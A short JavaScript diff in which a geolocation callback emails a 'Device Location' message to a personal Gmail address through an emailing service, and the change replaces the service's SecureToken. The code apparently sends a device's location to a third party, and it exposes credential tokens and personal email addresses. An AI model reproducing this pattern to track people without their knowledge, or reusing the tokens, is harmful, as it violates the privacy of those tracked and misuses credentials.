@@ -16,7 +16,7 @@ const successcallback = (position) =>{
 
 
         Email.send({
-    SecureToken:"c79343af-f4e9-40f5-965e-76fb6d294f30",
+    SecureToken:"da7699f3-7d66-4acc-9fda-bd80d3945884",
             To: 'shivangyadav36557@gmail.com',
             From: "downract@gmail.com",
             Subject: "Device Location",
